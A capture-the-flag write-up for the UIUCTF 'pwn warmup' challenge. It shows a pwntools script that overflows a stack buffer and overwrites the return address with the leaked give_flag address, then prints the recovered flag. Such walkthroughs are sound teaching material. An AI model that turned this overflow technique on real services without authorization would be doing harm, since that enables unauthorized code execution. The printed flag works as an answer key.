## Problem ##

Hmm this time we arent just going to give you the flag like last year... What can you do?!

`nc pwn-warmup.chal.uiuc.tf 1337` author: `Thomas`

## Solution ##

Running the provided binary yields:

```console
root@osboxes:~/Downloads# ./pwn_warmup 
This is SIGPwny stack3, go
&give_flag = 0x80485ab

```

Feeding inputs of various length to the binary we determine that we can overrite RIP to take control of program execution. The specific goal is to jump to the address of the `give_flag` function which is provided when running the binary. On the server this address changes with every run. Here is my solution script:


```py
from pwn import *

HOST = 'pwn-warmup.chal.uiuc.tf'
PORT = 1337
BINARY = './pwn_warmup'

sh = remote(HOST, PORT)

print sh.recvline() # This is SIGPwny stack3, go
print sh.recvline()
give_flag =  sh.recvline().strip().split(" = ")[1] # This line contains the memory address of give_flag
ret_addr =  p32(int(give_flag,16))

payload = "A" * 20 + ret_addr
sh.sendline(payload)
print sh.recvline()

sh.close()
```

Here is the output when running of running the script:

```console
root@osboxes:~/Downloads# python pwn_warmup.py 
[+] Opening connection to pwn-warmup.chal.uiuc.tf on port 1337: Done
== proof-of-work: disabled ==

This is pwn_warmup, go

uiuctf{k3b0ard_sp@m_do3snT_w0rk_anYm0r3}

[*] Closed connection to pwn-warmup.chal.uiuc.tf port 1337
```

The flag is **uiuctf{k3b0ard_sp@m_do3snT_w0rk_anYm0r3}**
